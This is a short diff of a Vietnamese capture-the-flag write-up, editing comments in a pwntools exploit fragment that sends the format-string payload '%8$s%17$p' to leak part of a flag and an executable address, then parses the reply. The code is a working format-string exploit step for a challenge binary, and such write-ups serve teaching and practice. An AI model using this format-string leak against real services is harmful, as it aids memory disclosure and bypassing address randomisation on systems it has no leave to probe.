@@ -128,6 +128,6 @@ Dùng `%8$s` để đọc nửa flag đầu trước. Sáu đó dùng `%17$p` đ
 	p.sendlineafter(b'Your name: ',b'%8$s%17$p')
 	
 	p.recvuntil(b'Hello ')
-	flag=p.recvuntil(b'0x',drop=True)        //lấy dữ liệu sau 'Hello ' gán vào biến flag, loại bỏ kí tự '0x' do C tự động thêm vào khi dùng %p
-	exe_leak=int(p.recvline()[:-1],16)       //lấy hết nguyên dòng địa chỉ và [:-1] bỏ đi kí tự \n từ recvline()
+	flag=p.recvuntil(b'0x',drop=True)      //lấy dữ liệu sau 'Hello ' gán vào biến flag, bỏ kí tự '0x' do C thêm vào khi dùng %p
+	exe_leak=int(p.recvline()[:-1],16)     //lấy hết nguyên dòng địa chỉ và [:-1] bỏ đi kí tự \n từ recvline()
 
